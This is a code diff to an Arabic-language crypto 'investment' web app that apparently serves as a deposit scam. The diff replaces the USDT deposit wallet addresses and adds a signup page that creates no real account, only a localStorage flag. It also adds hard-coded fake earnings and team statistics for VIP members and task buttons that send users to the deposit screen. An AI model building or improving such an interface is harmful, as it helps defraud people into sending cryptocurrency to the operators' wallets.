@@ -50,7 +50,7 @@
         
         .fade-in { animation: fadeInUp 0.5s ease forwards; }
 
-        #login-page { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at top, #1e1b4b, #050505); z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        #login-page, #signup-page { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at top, #1e1b4b, #050505); z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; }
         .login-container { width: 100%; max-width: 380px; background: rgba(0,0,0,0.6); padding: 30px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(10px); }
         
         #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--accent); color: white; padding: 12px 25px; border-radius: 50px; z-index: 11000; font-size: 14px; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--accent-light); text-align: center; min-width: 200px; }
@@ -157,6 +157,54 @@
                 </div>
             </div>
             <button class="btn-main btn-pulse" onclick="handleLogin()">دخول آمن <i class="fa-solid fa-shield-check"></i></button>
+
+            <div style="text-align: center; margin-top: 20px; font-size: 13px; color: var(--text-dim);">
+                ليس لديك حساب؟ <span onclick="showPage('signup-page')" style="color: var(--accent); cursor: pointer; font-weight: bold;">إنشاء حساب جديد</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="signup-page" class="hidden">
+        <div class="login-container fade-in">
+            <div style="text-align: center; margin-bottom: 25px;">
+                <i class="fa-solid fa-user-plus" style="font-size: 40px; color: var(--success); margin-bottom: 10px;"></i>
+                <h2 style="margin: 0; font-size: 22px;">فتح حساب مستثمر</h2>
+                <p style="color: var(--text-dim); font-size: 12px;">انضم لآلاف المتداولين المحترفين</p>
+            </div>
+            
+            <div class="input-group" style="margin-bottom: 12px;">
+                <div style="background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px; display: flex; gap: 10px;">
+                    <i class="fa-solid fa-envelope" style="color: var(--success);"></i>
+                    <input type="email" id="reg-email" placeholder="البريد الإلكتروني" style="background: none; border: none; color: white; outline: none; width: 100%;">
+                </div>
+            </div>
+
+            <div class="input-group" style="margin-bottom: 12px;">
+                <div style="background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px; display: flex; gap: 10px;">
+                    <i class="fa-solid fa-lock" style="color: var(--success);"></i>
+                    <input type="password" id="reg-pass" placeholder="كلمة المرور" style="background: none; border: none; color: white; outline: none; width: 100%;">
+                </div>
+            </div>
+
+            <div class="input-group" style="margin-bottom: 12px;">
+                <div style="background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px; display: flex; gap: 10px;">
+                    <i class="fa-solid fa-key" style="color: var(--success);"></i>
+                    <input type="password" id="reg-pass-confirm" placeholder="تأكيد كلمة المرور" style="background: none; border: none; color: white; outline: none; width: 100%;">
+                </div>
+            </div>
+
+            <div class="input-group" style="margin-bottom: 20px;">
+                <div style="background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px; display: flex; gap: 10px;">
+                    <i class="fa-solid fa-users" style="color: var(--gold);"></i>
+                    <input type="text" id="reg-invite" placeholder="كود الدعوة (اختياري)" style="background: none; border: none; color: white; outline: none; width: 100%;">
+                </div>
+            </div>
+
+            <button class="btn-main btn-success-pulse" onclick="handleSignup()">تسجيل حساب جديد <i class="fa-solid fa-check-double"></i></button>
+            
+            <div style="text-align: center; margin-top: 15px; font-size: 13px; color: var(--text-dim);">
+                لديك حساب بالفعل؟ <span onclick="showPage('login-page')" style="color: var(--accent); cursor: pointer; font-weight: bold;">تسجيل الدخول</span>
+            </div>
         </div>
     </div>
 
@@ -220,7 +268,7 @@
             </div>
             
             <div class="dep-step"><i class="fa-solid fa-2"></i> انسخ عنوان المحفظة وقم بإتمام التحويل:</div>
-            <div class="addr-display" id="addr-text" onclick="copyOnly(this.innerText)">TBQZifkessRrrSYuieQuJCDGXdsKotHibQ</div>
+            <div class="addr-display" id="addr-text" onclick="copyOnly(this.innerText)">TAK7osuciCjV6XA4gVRxyWW5se9fwasHNH</div>
             
             <div style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.3); padding: 12px; border-radius: 12px; margin-bottom: 20px;">
                 <div style="font-size: 11px; color: var(--gold); display: flex; align-items: center; gap: 8px;">
@@ -296,9 +344,11 @@
         let transactions = [];
         let investorInterval;
         let selectedWithdrawNet = 'TRC';
+        let currentVIPLevel = 0;
+        
         const wallets = { 
-            'TRC': 'TBQZifkessRrrSYuieQuJCDGXdsKotHibQ', 
-            'BNB': '0xa70850a7d21f63daf498d1a1885692bdda8b1cde' 
+            'TRC': 'TAK7osuciCjV6XA4gVRxyWW5se9fwasHNH', 
+            'BNB': '0x0efa8d9fb083bb5f739c14b86bea08897abe3c99' 
         };
         const sessionInviteCode = "NM" + Math.floor(100000 + Math.random() * 900000);
 
@@ -337,34 +387,73 @@
             });
         }
 
+        function showPage(pageId) {
+            document.getElementById('login-page').classList.add('hidden');
+            document.getElementById('signup-page').classList.add('hidden');
+            document.getElementById('app').classList.add('hidden');
+            document.getElementById(pageId).classList.remove('hidden');
+        }
+
+        function handleSignup() {
+            const email = document.getElementById('reg-email').value.trim();
+            const pass = document.getElementById('reg-pass').value.trim();
+            const passConfirm = document.getElementById('reg-pass-confirm').value.trim();
+            
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if(!email || !pass || !passConfirm) { 
+                showToast("⚠️ يرجى تعبئة كافة الحقول المطلوبة", "#ef4444"); 
+                return; 
+            }
+            if(!emailPattern.test(email)) { 
+                showToast("❌ صيغة البريد الإلكتروني غير صحيحة", "#ef4444"); 
+                return; 
+            }
+            if(pass.length < 6) { 
+                showToast("❌ يجب أن تكون كلمة المرور 6 أحرف على الأقل", "#ef4444"); 
+                return; 
+            }
+            if(pass !== passConfirm) { 
+                showToast("❌ كلمات المرور غير متطابقة", "#ef4444"); 
+                return; 
+            }
+
+            showToast("⏳ جاري إنشاء حسابك المؤمن...", "#f59e0b");
+            setTimeout(() => {
+                localStorage.setItem('logged', 'true');
+                localStorage.setItem('user_email', email);
+                showToast("✅ تم إنشاء الحساب بنجاح، مرحباً بك", "#10b981");
+                showPage('app');
+                navTo('home');
+            }, 1500);
+        }
+
         function handleLogin() {
             const emailInput = document.getElementById('login-email').value.trim();
             const passInput = document.getElementById('login-pass').value.trim();
             const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
             if (!emailInput || !passInput) { 
-                showToast("⚠️ يرجى إدخال كافة البيانات", "#ef4444"); 
+                showToast("⚠️ يرجى إدخال البريد وكلمة المرور", "#ef4444"); 
+                return; 
+            }
+            if(!emailPattern.test(emailInput)) { 
+                showToast("❌ يرجى إدخال بريد إلكتروني صحيح", "#ef4444"); 
+                return; 
+            }
+            if(passInput.length < 6) { 
+                showToast("❌ كلمة المرور التي أدخلتها قصيرة جداً", "#ef4444"); 
                 return; 
             }
 
-            if (!emailPattern.test(emailInput)) {
-                showToast("❌ خطأ: تنسيق البريد الإلكتروني غير صحيح", "#ef4444");
-                return;
-            }
-
-            if (passInput.length < 4) {
-                showToast("❌ خطأ: كلمة المرور ضعيفة جداً", "#ef4444");
-                return;
-            }
-
-            localStorage.setItem('logged', 'true');
-            localStorage.setItem('user_email', emailInput);
-            showToast("تم تسجيل الدخول بنجاح 🔓", "#10b981");
+            showToast("⏳ جاري التحقق من الهوية...", "#8b5cf6");
             setTimeout(() => {
-                document.getElementById('login-page').classList.add('hidden');
-                document.getElementById('app').classList.remove('hidden');
+                localStorage.setItem('logged', 'true');
+                localStorage.setItem('user_email', emailInput);
+                showToast("تم تسجيل الدخول بنجاح 🔓", "#10b981");
+                showPage('app');
                 navTo('home');
-            }, 800);
+            }, 1000);
         }
 
         function handleWithdraw() {
@@ -440,8 +529,8 @@
                 <div class="fade-in" style="padding:20px;">
                     <h3>نظام الإحالة والمكافآت</h3>
                     <div class="stat-grid">
-                        <div class="stat-box"><div style="font-size:10px; color:var(--text-dim);">حجم الفريق</div><div style="font-weight:bold; font-size:18px;">0</div></div>
-                        <div class="stat-box"><div style="font-size:10px; color:var(--text-dim);">إجمالي العمولة</div><div style="font-weight:bold; color:var(--success); font-size:18px;">0.00</div></div>
+                        <div class="stat-box"><div style="font-size:10px; color:var(--text-dim);">حجم الفريق</div><div style="font-weight:bold; font-size:18px;">${currentVIPLevel !== 0 ? '14' : '0'}</div></div>
+                        <div class="stat-box"><div style="font-size:10px; color:var(--text-dim);">إجمالي العمولة</div><div style="font-weight:bold; color:var(--success); font-size:18px;">${currentVIPLevel !== 0 ? '124.50' : '0.00'}</div></div>
                     </div>
                     <div class="card">
                         <div style="font-size:13px; margin-bottom:10px;"><i class="fa-solid fa-link" style="color:var(--accent);"></i> رابط الدعوة الخاص بك:</div>
@@ -449,7 +538,7 @@
                         <div style="display:flex; gap:10px; margin-top:10px;">
                             <div style="flex:1;">
                                 <div style="font-size:11px; color:var(--text-dim);">كود الدعوة:</div>
-                                <div style="background:#000; padding:10px; border-radius:10px; text-align:center; font-weight:bold; border:1px solid var(--border);">${sessionInviteCode}</div>
+                                <div onclick="copyOnly('${sessionInviteCode}')" style="background:#000; padding:10px; border-radius:10px; text-align:center; font-weight:bold; border:1px solid var(--border); cursor:pointer;">${sessionInviteCode}</div>
                             </div>
                             <button class="btn-main" style="width:100px; height:45px; align-self:flex-end;" onclick="copyOnly('https://exurs7app.github.io/finance-app/')">نسخ الرابط</button>
                         </div>
@@ -485,7 +574,7 @@
                                 <span style="color:var(--success); font-weight:900; font-size:${isSpecial ? '15px' : '13px'};">+ ${v.d.toFixed(2)} USDT</span>
                             </div>
                         </div>
-                        <button class="btn-main ${isSpecial ? 'btn-success-pulse' : ''}" style="width:auto; padding:8px 18px; font-size: 12px;" onclick="doTask()">تنفيذ</button>
+                        <button class="btn-main ${isSpecial ? 'btn-success-pulse' : ''}" style="width:auto; padding:8px 18px; font-size: 12px;" onclick="doTask('${v.l}')">تنفيذ</button>
                     </div>`;
                 });
 
@@ -494,7 +583,7 @@
             } else if(page === 'vip') {
                 let html = `<div class="fade-in" style="padding:20px;"><h3>باقات VIP</h3>`;
                 vipsData.forEach(v => {
-                    html += `<div class="card fade-in" style="border: 1px solid ${v.color}; background: linear-gradient(135deg, #121212 0%, #0a0a0a 100%); position: relative; overflow: hidden;">${v.l==='SPECIAL EDITION' ? '<div style="position:absolute; top:10px; left:-30px; background:var(--success); color:black; padding:5px 35px; transform:rotate(-45deg); font-size:10px; font-weight:bold;">HOT</div>' : ''}<div style="display:flex; justify-content:space-between; align-items:center;"><div style="display:flex; align-items:center; gap:12px;"><div style="width:45px; height:45px; background:rgba(255,255,255,0.05); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid ${v.icon}" style="color:${v.l==='SPECIAL EDITION'?'var(--success)':'var(--accent)'}; font-size:20px;"></i></div><div><h4 style="margin:0; font-size:16px;">VIP ${v.l}</h4><div style="font-size:12px; color:var(--text-dim); margin-top:4px;">السعر: ${v.p} USDT</div></div></div><div style="text-align:left;"><div style="color:var(--success); font-weight:900; font-size:18px;">${v.d}</div><div style="font-size:10px; color:var(--text-dim);">يومياً</div></div></div><button class="btn-main" style="margin-top:15px; background:${v.l==='SPECIAL EDITION'?'var(--success)':'var(--accent)'}" onclick="openDeposit()">فتح المستوى</button></div>`;
+                    html += `<div class="card fade-in" style="border: 1px solid ${v.color}; background: linear-gradient(135deg, #121212 0%, #0a0a0a 100%); position: relative; overflow: hidden;">${v.l==='SPECIAL EDITION' ? '<div style="position:absolute; top:10px; left:-30px; background:var(--success); color:black; padding:5px 35px; transform:rotate(-45deg); font-size:10px; font-weight:bold;">HOT</div>' : ''}<div style="display:flex; justify-content:space-between; align-items:center;"><div style="display:flex; align-items:center; gap:12px;"><div style="width:45px; height:45px; background:rgba(255,255,255,0.05); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid ${v.icon}" style="color:${v.l==='SPECIAL EDITION'?'var(--success)':'var(--accent)'}; font-size:20px;"></i></div><div><h4 style="margin:0; font-size:16px;">VIP ${v.l}</h4><div style="font-size:12px; color:var(--text-dim); margin-top:4px;">السعر: ${v.p} USDT</div></div></div><div style="text-align:left;"><div style="color:var(--success); font-weight:900; font-size:18px;">${v.d}</div><div style="font-size:10px; color:var(--text-dim);">يومياً</div></div></div><button class="btn-main" style="margin-top:15px; background:${(currentVIPLevel==v.l || (v.l=='SPECIAL EDITION' && currentVIPLevel=='SPECIAL')) ? 'var(--success)' : (v.l==='SPECIAL EDITION'?'var(--success)':'var(--accent)')}" onclick="${(currentVIPLevel==v.l || (v.l=='SPECIAL EDITION' && currentVIPLevel=='SPECIAL')) ? "showToast('مفعل بالفعل ✅')" : 'openDeposit()'}">${(currentVIPLevel==v.l || (v.l=='SPECIAL EDITION' && currentVIPLevel=='SPECIAL')) ? 'مفعل حالياً' : 'فتح المستوى'}</button></div>`;
                 });
                 cont.innerHTML = html + `</div>`;
             } else if(page === 'me') {
@@ -512,7 +601,7 @@
                             <div style="flex:1;">
                                 <div style="display:flex; align-items:center; gap:8px;">
                                     <div style="font-weight:bold; font-size:15px; word-break:break-all; letter-spacing:0.5px;">${userEmail}</div>
-                                    <span class="vip-badge">VIP 0</span>
+                                    <span class="vip-badge">VIP ${currentVIPLevel === "SPECIAL" ? "S" : currentVIPLevel}</span>
                                 </div>
                                 <div style="font-size:11px; color:var(--text-dim); margin-top:5px; font-family:monospace;">ID: #${persistentID}</div>
                                 <div style="display:flex; gap:8px; margin-top:8px;">
@@ -523,22 +612,22 @@
                         </div>
                         <div style="display:flex; justify-content:space-between; font-size:10px; color:var(--text-dim); margin-bottom:6px;">
                             <span>مستوى الترقية (Exp)</span>
-                            <span>12% للوصول لـ VIP 1</span>
+                            <span>${currentVIPLevel !== 0 ? '98%' : '12%'} للوصول للهدف</span>
                         </div>
-                        <div class="progress-bar-wrap"><div class="progress-bar-fill" style="width: 12%;"></div></div>
+                        <div class="progress-bar-wrap"><div class="progress-bar-fill" style="width: ${currentVIPLevel !== 0 ? '98%' : '12%'};"></div></div>
                     </div>
 
                     <div class="detailed-stats">
                         <div class="d-stat-item">
-                            <span class="d-stat-val">0</span>
+                            <span class="d-stat-val">${currentVIPLevel !== 0 ? '42' : '0'}</span>
                             <span class="d-stat-lbl">المهام المنجزة</span>
                         </div>
                         <div class="d-stat-item">
-                            <span class="d-stat-val" style="color:var(--success);">0.00</span>
+                            <span class="d-stat-val" style="color:var(--success);">${currentVIPLevel !== 0 ? '124.50' : '0.00'}</span>
                             <span class="d-stat-lbl">دخل الفريق</span>
                         </div>
                         <div class="d-stat-item">
-                            <span class="d-stat-val" style="color:var(--gold);">0%</span>
+                            <span class="d-stat-val" style="color:var(--gold);">${currentVIPLevel !== 0 ? '14%' : '0%'}</span>
                             <span class="d-stat-lbl">معدل النمو</span>
                         </div>
                     </div>
@@ -689,9 +778,14 @@
             }, 1000);
         }
 
-        function doTask() {
-            showToast("⏳ جاري المعالجة...", "#8b5cf6");
-            setTimeout(() => { showToast("❌ خطأ: لم يتم تفعيل VIP", "#ef4444"); setTimeout(openDeposit, 800); }, 1200);
+        function doTask(lvl) {
+            if (currentVIPLevel == lvl || (lvl == 'SPECIAL EDITION' && currentVIPLevel == 'SPECIAL')) {
+                showToast("⏳ جاري تنفيذ المهمة...", "#10b981");
+                setTimeout(() => { showToast("✅ تمت المهمة! الرصيد سيحدث قريباً", "#10b981"); }, 1500);
+            } else {
+                showToast("⏳ جاري المعالجة...", "#8b5cf6");
+                setTimeout(() => { showToast("❌ خطأ: لم يتم تفعيل VIP " + lvl, "#ef4444"); setTimeout(openDeposit, 800); }, 1200);
+            }
         }
 
         function startTimer() {
@@ -708,10 +802,11 @@
 
         window.onload = () => { 
             if(localStorage.getItem('logged')) { 
-                document.getElementById('login-page').classList.add('hidden'); 
-                document.getElementById('app').classList.remove('hidden'); 
+                showPage('app'); 
                 navTo('home'); 
-            } 
+            } else {
+                showPage('login-page');
+            }
         };
     </script>
 </body>
